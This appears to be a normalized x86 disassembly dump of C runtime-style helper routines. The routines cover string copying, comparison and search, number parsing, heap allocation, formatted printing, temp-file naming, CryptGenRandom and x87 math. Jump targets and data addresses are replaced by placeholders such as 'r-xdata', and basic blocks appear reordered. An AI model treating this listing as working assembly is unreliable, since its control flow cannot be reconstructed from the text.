jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x3a ]
cmp ecx 0x7
jb r-xdata
lea ecx [ eax - 0x5b ]
cmp ecx 0x6
jb r-xdata
add eax 0xffffff85
cmp eax 0x4
jb r-xdata
xor eax eax
retn
sub_410fb2
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x61 ]
cmp ecx 0x6
jb r-xdata
add eax 0xffffffbf
cmp eax 0x6
jb r-xdata
xor eax eax
retn
sub_410fef
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
leave
retn
sub_411073
xor eax eax
cmp [ esp + 0xc ] eax
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x4 ]
add eax ecx
retn
inc eax
cmp eax [ esp + 0xc ]
jb r-xdata
mov dl [ eax + ecx ]
cmp dl [ esp + 0x8 ]
je r-xdata
sub_411095
push ebx
xor ecx ecx
cmp [ esp + 0x10 ] ecx
push esi
push edi
jbe r-xdata
xor eax eax
mov edx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
mov edi edx
mov eax esi
sub edi esi
movsx eax [ ecx + esi ]
movsx ecx [ ecx + edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc eax
cmp ecx [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ eax ]
cmp bl [ edi + eax ]
jne r-xdata
sub_4110cf
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub eax ecx
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
sub_4110f1
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp edi esi
ja r-xdata
mov edx [ esp + 0x14 ]
test edx edx
je r-xdata
push [ esp + 0x14 ]
push esi
push edi
call sub_4110cf
add esp 0xc
jmp r-xdata
mov eax edi
lea ecx [ edi + edx - 0x1 ]
sub esi edi
pop edi
pop esi
retn
mov al [ esi + ecx ]
dec edx
mov [ ecx ] al
dec ecx
test edx edx
jne r-xdata
sub_41112d
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov al [ esp + 0x8 ]
push ebx
mov bl al
mov bh bl
mov edx ecx
push edi
mov edi [ esp + 0xc ]
shr ecx 0x2
mov eax ebx
shl eax 0x10
mov ax bx
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_411160
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc esi
push esi
push 0x0
push eax
call [ HeapAlloc@IAT ]
pop esi
retn
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
sub_41118a
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc esi
push esi
push 0x0
push eax
call [ HeapAlloc@IAT ]
pop esi
retn
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
sub_4111b4
fld [ esp + 0xc ]
fld [ esp + 0x4 ]
fyl2x
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_4111d4
fld [ esp + 0x8 ]
fld [ esp + 0x4 ]
fyl2x
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_4111f1
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
mov [ ebp - 0x400 ] 0x0
call [ wvsprintfA@IAT ]
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call sub_410cd0
pop ecx
pop ecx
leave
retn
sub_41122a
push esi
push edi
mov esi rw-data
push esi
push [ esp + 0x10 ]
call sub_410cd0
mov edi eax
cmp edi 0xffffffff
pop ecx
pop ecx
jne r-xdata
push esi
push r--data
call sub_410cd0
cmp eax 0xffffffff
pop ecx
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
retn
sub_411261
cmp eax ecx
push edi
mov edi edx
je r-xdata
pop edi
retn
cmp edi 0x3
push ebx
jbe r-xdata
test edi edi
jne r-xdata
push esi
lea esi [ edi - 0x4 ]
shr esi 0x2
inc esi
mov bl [ ecx ]
mov dl [ eax ]
dec edi
mov [ eax ] bl
inc eax
mov [ ecx ] dl
inc ecx
pop ebx
mov ebx [ ecx ]
mov edx [ eax ]
mov [ eax ] ebx
mov [ ecx ] edx
add eax 0x4
add ecx 0x4
sub edi 0x4
dec esi
jne r-xdata
pop esi
jmp r-xdata
sub_41129f
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ecx
sub eax ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
lea edx [ ebx + edi ]
cmp edx ecx
push ecx
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x8 ] ecx
push ebx
je r-xdata
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
xor edx edx
div edi
mov esi eax
shr esi 0x1
imul esi edi
add esi ebx
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
pop edi
pop esi
mov ecx [ ebp + 0xc ]
mov edx edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
jmp sub_411261
push [ ebp + 0xc ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax ebx
call sub_411261
push esi
push ebx
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_411261
add [ ebp + 0x10 ] edi
push esi
push [ ebp + 0x10 ]
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jl r-xdata
mov edx edi
mov ecx esi
mov eax ebx
call sub_411261
sub [ ebp + 0x8 ] edi
push [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jl r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
cmp ecx ebx
jbe r-xdata
mov edx edi
call sub_411261
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
sub eax ebx
cmp eax ecx
push edi
jle r-xdata
push [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
mov esi [ ebp + 0x10 ]
jmp r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_41129f
mov ebx [ ebp + 0x10 ]
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
call sub_41129f
mov eax [ ebp + 0x10 ]
add esp 0x10
sub eax edi
mov [ ebp + 0xc ] eax
jmp r-xdata
sub [ ebp + 0x8 ] edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
sub eax ebx
jne r-xdata
sub_4113e2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x2
jb r-xdata
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
dec eax
imul eax [ ebp + 0x10 ]
push [ ebp + 0x10 ]
add eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_41129f
add esp 0x10
sub_411453
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
or eax 0xffffffff
leave
retn
lea ecx [ ebp - 0x4 ]
push ecx
push 0x4
push eax
call [ CryptGenRandom@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
sub_411502
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_411519
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x8 ] 0x1
call sub_41035b
add esp 0xc
leave
retn
sub_411558
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fsubp st1
fld [ r--data ]
fdivp st1
retn
sub_41155e
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fsubp st1
fld [ r--data ]
fdivp st1
retn
sub_411589
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
call sub_40fd08
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
cmp eax esi
lea ecx [ esi - 0x1 ]
jae r-xdata
mov [ ecx + edi ] 0x0
mov ecx eax
sub_4115f3
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
call sub_41035b
add esp 0xc
leave
retn
sub_41161c
push esi
mov esi [ GetStdHandle@IAT ]
push 0xfffffff6
call esi
or [ rw-data ] 0xffffffff
push 0xfffffff5
mov [ rw-data ] eax
call esi
or [ rw-data ] 0xffffffff
push 0xfffffff4
mov [ rw-data ] eax
call esi
or [ rw-data ] 0xffffffff
mov [ rw-data ] eax
xor eax eax
pop esi
retn
sub_411657
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0xc ]
push eax
call sub_4116d8
pop ecx
pop ecx
mov eax esi
pop esi
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_411692
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
jmp r-xdata
mov al [ ecx ]
cmp al [ edx ]
je r-xdata
test al al
je r-xdata
movsx ecx [ edx ]
movsx eax al
sub eax ecx
retn
xor eax eax
retn
inc ecx
inc edx
sub_4116ed
mov ecx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
cmp [ ecx ] 0x0
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov bl [ eax ]
inc esi
cmp [ esi + ecx ] 0x0
jne r-xdata
mov dl [ esi + ecx ]
mov al bl
test bl bl
mov edi [ esp + 0x14 ]
je r-xdata
inc edi
mov al [ edi ]
test al al
jne r-xdata
cmp al dl
je r-xdata
sub_411747
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp [ esi ] al
je r-xdata
push eax
push esi
call [ CharLowerBuffA@IAT ]
mov eax esi
pop esi
retn
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
sub_411765
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
call sub_4117bc
add esp 0xc
mov eax esi
pop esi
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_41178c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
pop ebp
retn
dec [ ebp + 0x10 ]
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
movsx eax [ edx ]
movsx ecx [ ecx ]
sub eax ecx
pop ebp
retn
test al al
je r-xdata
inc edx
inc ecx
sub_4117bc
push esi
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
test esi esi
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
test esi esi
jne r-xdata
mov [ eax ] 0x0
dec esi
cmp [ eax ] 0x0
je r-xdata
or esi 0xffffffff
sub_4117ed
mov eax [ esp + 0x4 ]
mov dl [ eax ]
test dl dl
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
mov bl [ edi ]
inc eax
mov dl [ eax ]
test dl dl
jne r-xdata
mov cl bl
test bl bl
mov esi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
mov cl [ esi ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
sub_411820
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
movsx eax [ ecx ]
sub eax [ esp + 0x8 ]
neg eax
sbb eax eax
not eax
and eax ecx
retn
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
cmp ecx eax
jne r-xdata
movsx edx [ ecx ]
cmp edx [ esp + 0x8 ]
je r-xdata
dec ecx
sub_411851
mov ecx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
cmp [ ecx ] 0x0
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov bl [ eax ]
cmp [ edi ] 0x0
je r-xdata
mov dl [ esi + ecx ]
mov al bl
inc esi
cmp [ esi + ecx ] 0x0
jne r-xdata
inc edi
mov al [ edi ]
test al al
jne r-xdata
test bl bl
mov edi [ esp + 0x14 ]
je r-xdata
cmp al dl
je r-xdata
sub_41188f
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
mov esi eax
sub esi edi
cmp [ ebx + edi ] 0x0
je r-xdata
mov ecx edi
pop edi
pop esi
pop ebx
retn
inc eax
inc esi
cmp [ eax ] 0x0
jne r-xdata
inc ebx
inc ecx
mov dl [ ecx ]
test dl dl
jne r-xdata
mov dl [ edi ]
xor ebx ebx
test dl dl
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
sub_4118cd
push ebp
mov ebp esp
push ecx
fldz
mov eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
fld st0
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x20
ja r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
cmp cl 0x2b
fstp st1
je r-xdata
mov ecx [ ebp + 0xc ]
fstp st0
test ecx ecx
je r-xdata
xor edx edx
cmp cl 0x2d
sete dl
inc eax
mov [ ebp + 0x8 ] edx
cmp cl 0x2d
jne r-xdata
leave
retn
mov [ ecx ] eax
leave
retn
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jb r-xdata
fld [ r--data ]
push esi
push edi
push 0x30
pop edi
push 0xa
pop esi
jmp r-xdata
test ecx ecx
fmul st1
mov [ ebp - 0x4 ] ecx
fild [ ebp - 0x4 ]
jge r-xdata
cmp [ eax ] 0x2e
fld [ r--data ]
jne r-xdata
faddp st2
inc eax
fadd [ r--data ]
mov cl [ eax ]
cmp cl 0x65
je r-xdata
fld st0
xor edx edx
inc eax
mov cl [ eax ]
cmp cl 0x2b
je r-xdata
cmp cl 0x45
jne r-xdata
fstp st0
test ecx ecx
mov [ ebp - 0x4 ] ecx
fild [ ebp - 0x4 ]
jge r-xdata
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
fstp st0
fmul st1
faddp st4
fmul st1
jmp r-xdata
fadd [ r--data ]
fstp st0
fstp st1
jmp r-xdata
fstp st0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ecx ] eax
inc eax
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jae r-xdata
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jae r-xdata
inc eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
fstp st0
test ecx ecx
pop edi
pop esi
je r-xdata
imul edx edx 0xa
add edx ecx
inc eax
movzx ecx [ eax ]
sub ecx edi
cmp ecx esi
jb r-xdata
fchs
test edx edx
je r-xdata
test dl 0x1
je r-xdata
sar edx 0x1
fld st0
fmulp st1
jne r-xdata
fld st0
fmulp st2
jmp r-xdata
sub_4119eb
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x0
push esi
push edi
mov edi [ esp + 0x10 ]
mov edx eax
je r-xdata
mov eax [ rw-data ]
cmp [ edx ] 0x0
mov ecx edx
mov esi edi
je r-xdata
push ebx
mov bl [ edi ]
mov eax edx
sub eax ecx
neg eax
sbb eax eax
pop edi
mov [ rw-data ] ecx
and eax edx
pop esi
retn
mov al [ ecx ]
cmp al [ esi ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov cl [ edx ]
mov al bl
mov [ ecx ] 0x0
inc ecx
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop ebx
inc edx
cmp [ edx ] 0x0
jne r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov esi edi
inc ecx
test bl bl
mov esi edi
je r-xdata
cmp al cl
je r-xdata
jmp r-xdata
sub_411a5f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov al [ ecx ]
test al al
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ ecx ] 0x0
mov edx ecx
mov esi edi
je r-xdata
push ebx
mov bl [ edi ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov eax ecx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ecx
pop esi
pop ebp
retn
mov al [ edx ]
cmp al [ esi ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov dl bl
mov [ edx ] 0x0
inc edx
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop ebx
inc ecx
mov al [ ecx ]
test al al
jne r-xdata
inc esi
mov dl [ esi ]
test dl dl
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov esi edi
inc edx
test bl bl
mov esi edi
je r-xdata
cmp dl al
je r-xdata
jmp r-xdata
sub_411ad7
mov eax [ esp + 0x4 ]
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x20
ja r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
cmp cl 0x2b
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
xor edx edx
cmp cl 0x2d
sete dl
inc eax
mov edi edx
cmp cl 0x2d
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ecx ] eax
cmp edx 0x10
jne r-xdata
cmp [ eax ] 0x30
je r-xdata
mov edx [ esp + 0x14 ]
test edx edx
jne r-xdata
pop edi
pop esi
retn
mov cl [ eax ]
test cl cl
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
lea ecx [ eax + 0x1 ]
mov dl [ ecx ]
cmp dl 0x78
je r-xdata
push 0xa
pop edx
jmp r-xdata
movzx ecx cl
cmp ecx 0x61
jb r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax + 0x1 ]
cmp cl 0x78
je r-xdata
push 0x10
pop edx
jmp r-xdata
cmp dl 0x58
je r-xdata
cmp ecx 0x41
jb r-xdata
sub ecx 0x20
test edi edi
je r-xdata
mov [ ecx ] eax
inc eax
inc eax
jmp r-xdata
cmp cl 0x58
jne r-xdata
push 0x8
pop edx
mov eax ecx
jmp r-xdata
add ecx 0xffffffd0
cmp ecx 0x9
ja r-xdata
sub ecx 0x37
jmp r-xdata
mov eax esi
neg esi
cmp ecx edx
jae r-xdata
imul esi edx
add esi ecx
inc eax
sub_411baa
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp [ esi ] al
je r-xdata
push eax
push esi
call [ CharUpperBuffA@IAT ]
mov eax esi
pop esi
retn
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
sub_411be0
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fld st1
fadd st1
fxch st2
fsubrp st1
fdivrp st1
retn
sub_411be6
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
fld st1
fadd st1
fxch st2
fsubrp st1
fdivrp st1
retn
sub_411c11
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
inc [ rw-data ]
jne r-xdata
mov esi rw-data
movzx eax [ rw-data ]
push esi
push eax
push r--data
push r--data
call [ GetTempFileNameA@IAT ]
neg eax
sbb eax eax
and eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_411c7e
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
or ah 0xc
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_411cb0
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0x10 ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0xc ]
mov [ ebp - 0x400 ] 0x0
push eax
call [ wvsprintfA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
call sub_410cd0
pop ecx
pop ecx
leave
retn
sub_411ce6
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0xc ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x400 ] 0x0
push eax
call [ wvsprintfA@IAT ]
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call sub_410cd0
pop ecx
pop ecx
leave
retn
sub_411d1e
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x14 ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
call sub_40fd08
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
cmp eax esi
lea ecx [ esi - 0x1 ]
jae r-xdata
mov [ ecx + edi ] 0x0
mov ecx eax
sub_411d74
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0xc ]
push eax
call sub_411dfd
pop ecx
pop ecx
mov eax esi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_411db3
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
je r-xdata
test ax ax
je r-xdata
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
retn
xor eax eax
retn
inc ecx
inc ecx
inc edx
inc edx
sub_411dfd
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
jmp r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
mov [ edx ] ax
inc edx
inc edx
inc ecx
inc ecx
and [ edx ] ax
mov eax [ esp + 0x4 ]
retn
sub_411e1e
mov edx [ esp + 0x4 ]
push ebx
xor eax eax
cmp [ edx ] ax
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
movzx ebx [ ecx ]
inc eax
cmp [ edx + eax * 2 ] 0x0
jne r-xdata
movzx esi [ edx + eax * 2 ]
movzx ecx bx
test bx bx
mov edi [ esp + 0x14 ]
je r-xdata
inc edi
inc edi
movzx ecx [ edi ]
test cx cx
jne r-xdata
cmp cx si
je r-xdata
sub_411e72
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
mov eax esi
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
call sub_411ed1
add esp 0xc
mov eax esi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_411e9c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
pop ebp
retn
dec [ ebp + 0x10 ]
jne r-xdata
movzx eax [ edx ]
cmp ax [ ecx ]
jne r-xdata
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop ebp
retn
test ax ax
je r-xdata
inc edx
inc edx
inc ecx
inc ecx
sub_411ed1
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
test edx edx
pop esi
je r-xdata
mov si [ ecx ]
mov [ eax ] si
inc eax
inc eax
inc ecx
inc ecx
test edx edx
jne r-xdata
and [ eax ] 0x0
dec edx
cmp [ eax ] 0x0
je r-xdata
or edx 0xffffffff
sub_411f08
mov eax [ esp + 0x4 ]
movzx edx [ eax ]
test dx dx
push ebx
push esi
push edi
je r-xdata
xor eax eax
mov ebx [ esp + 0x14 ]
movzx edi [ ebx ]
inc eax
inc eax
movzx edx [ eax ]
test dx dx
jne r-xdata
movzx ecx di
test di di
mov esi ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
sub_411f47
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
mov dx [ esp + 0x8 ]
mov eax ecx
je r-xdata
mov cx [ eax ]
sub cx dx
neg cx
sbb ecx ecx
not ecx
and eax ecx
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
cmp eax ecx
jne r-xdata
cmp [ eax ] dx
je r-xdata
dec eax
dec eax
sub_411f7d
mov edx [ esp + 0x4 ]
push ebx
xor eax eax
cmp [ edx ] ax
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
movzx ebx [ ecx ]
cmp [ esi ] 0x0
je r-xdata
movzx edi [ edx + eax * 2 ]
movzx ecx bx
inc eax
cmp [ edx + eax * 2 ] 0x0
jne r-xdata
inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
test bx bx
mov esi [ esp + 0x14 ]
je r-xdata
cmp cx di
je r-xdata
sub_411fc3
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
push esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
cmp [ edi + esi * 2 ] 0x0
je r-xdata
xor ecx ecx
movzx edx dx
pop edi
pop esi
retn
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
inc esi
lea ecx [ esi + esi ]
movzx edx [ ecx + edi ]
test dx dx
jne r-xdata
movzx edx [ edi ]
xor esi esi
test dx dx
je r-xdata
cmp [ ecx + eax ] dx
jne r-xdata
sub_412009
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
movzx eax [ ecx ]
cmp ax di
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ ecx ] di
mov eax [ ebp + 0xc ]
mov edx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push ebx
movzx ebx [ edx ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov eax ecx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ecx
pop esi
pop ebp
retn
mov si [ edx ]
cmp si [ eax ]
je r-xdata
cmp [ esi ] di
je r-xdata
movzx edx bx
mov [ edx ] di
inc edx
inc edx
inc eax
inc eax
cmp [ eax ] di
jne r-xdata
pop ebx
inc ecx
inc ecx
movzx eax [ ecx ]
cmp ax di
jne r-xdata
inc esi
inc esi
movzx edx [ esi ]
cmp dx di
jne r-xdata
cmp [ edx ] di
jne r-xdata
mov eax [ ebp + 0xc ]
inc edx
inc edx
cmp bx di
mov esi [ ebp + 0xc ]
je r-xdata
cmp dx ax
je r-xdata
jmp r-xdata
sub_412097
xor eax eax
cmp [ esp + 0xc ] eax
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x4 ]
lea eax [ ecx + eax * 2 ]
retn
inc eax
cmp eax [ esp + 0xc ]
jb r-xdata
